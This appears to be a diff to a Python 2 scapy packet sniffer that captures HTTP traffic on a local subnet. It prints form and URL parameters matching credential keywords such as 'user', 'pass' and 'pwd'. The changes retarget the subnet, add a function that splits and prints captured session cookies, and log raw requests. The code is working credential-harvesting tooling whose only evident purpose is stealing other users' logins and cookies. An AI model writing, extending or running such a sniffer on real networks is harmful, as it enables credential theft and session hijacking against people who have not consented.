@@ -12,7 +12,7 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
-local_ip = "169.254.1."
+local_ip = "172.16.0."
 keywords = ["user", "pass", "account", "pwd", "log"]
 
 def dump_info(data):
@@ -22,6 +22,10 @@ def dump_info(data):
         for param in params:
             if param.startswith(keyword):
                 print "  \033[1;31m[CAPTURED] \033[1;m" + param
+
+def dump_cookie(data):
+    for cookie in data.split(";"):
+        print "  \033[1;33m[COOKIE] \033[1;m" + cookie.strip()
 
 def http_handler(packet):
 
@@ -48,7 +52,7 @@ def http_handler(packet):
             print "\033[1;32m[HTTP]\033[1;m %-15s => %-15s %-4s %s%s" % ( packet[IP].src, packet[IP].dst, request_method , headers["host"], request_path )
 
             if "Cookie" in headers:
-                print "  \033[1;31m[CAPTURED] \033[1;m" + headers["Cookie"]
+                dump_cookie(headers["Cookie"])
 
             if request_method == "GET":
                 if request_param:
@@ -58,6 +62,7 @@ def http_handler(packet):
                 if headers["Content-Type"] == "application/x-www-form-urlencoded":
                     dump_info(post_data)
         else:
+            print "\033[1;32m[HTTP]\033[1;m %-15s => %-15s RAW " % ( packet[IP].src, packet[IP].dst )
             dump_info(request)
 
 
